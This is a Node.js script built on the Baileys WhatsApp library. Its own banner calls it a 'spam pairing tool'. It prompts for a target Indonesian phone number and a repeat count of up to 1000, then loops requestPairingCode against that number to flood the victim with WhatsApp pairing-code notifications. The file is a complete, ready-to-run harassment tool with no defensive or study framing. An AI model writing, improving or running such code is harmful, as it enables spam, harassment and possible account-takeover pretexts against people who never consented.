const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, (ans) => { rl.close(); resolve(ans); }));
};

function normalizePhoneNumber(input) {
    let num = input.replace(/[^\d]/g, '');
    if (num.startsWith('0')) num = '62' + num.slice(1);
    if (num.startsWith('+62')) num = '62' + num.slice(3);
    return num;
}

const delay = (ms) => new Promise(res => setTimeout(res, ms));

async function loadingSpinner(text, duration = 2000, interval = 100) {
    const frames = ['⠸', '⠴', '⠦', '⠧'];
    let i = 0;
    const start = Date.now();
    while (Date.now() - start < duration) {
        process.stdout.write(`\r${text} ${frames[i % frames.length]} `);
        await delay(interval);
        i++;
    }
    process.stdout.write('\r' + ' '.repeat(50) + '\r');
}

async function LuciferXSatanic() {
    const { state } = await useMultiFileAuthState('./LUCIFER/session');
    const LuciferBot = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    while (true) {
        console.clear();
        console.log(wColor + `
 • スパムペアリングツール
 • 作成者: Hazel
 • 使用注意
┏❐
┃ [ 以下の指示に従ってください ]
┃
┃⭔ ターゲット番号 (例: 62xxxxxxx / +62 xxxx / 08xxxx)
┃⭔ スパム回数 (1-1000)
┃⭔ Ketik "exit" kapan saja untuk keluar
┗❐
` + xColor);

        try {
            let rawNumber = await question(wColor + 'ターゲット番号を入力してください : ' + xColor);
            if (rawNumber.toLowerCase() === 'exit') {
                console.log('Keluar...');
                process.exit(0);
            }
            let phoneNumber = normalizePhoneNumber(rawNumber);
            if (!phoneNumber.startsWith('62')) {
                console.log('❌ インドネシア国番号 (62) を必ず使用してください');
                await delay(2000);
                continue;
            }

            let rawCount = await question(wColor + 'スパム回数を入力してください : ' + xColor);
            if (rawCount.toLowerCase() === 'exit') {
                console.log('Keluar...');
                process.exit(0);
            }
            const LuciferCodes = parseInt(rawCount);
            if (isNaN(LuciferCodes) || LuciferCodes <= 0) {
                console.log('例 : 20');
                await delay(2000);
                continue;
            }

            for (let i = 0; i < LuciferCodes; i++) {
                try {
                    await loadingSpinner(`Sending package to ${phoneNumber}`, 2000, 200);
                    let code = await LuciferBot.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(wColor + `スパム成功 ✅ 番号 : ${phoneNumber} [${i + 1}/${LuciferCodes}]` + xColor);
                } catch (error) {
                    console.error('エラー:', error.message);
                }
                await delay(5000);
            }

            console.log('\nSelesai! Menunggu input baru...');
            await delay(3000);

        } catch (error) {
            console.error('エラーが発生しました', error.message);
            await delay(3000);
        }
    }
}

LuciferXSatanic();
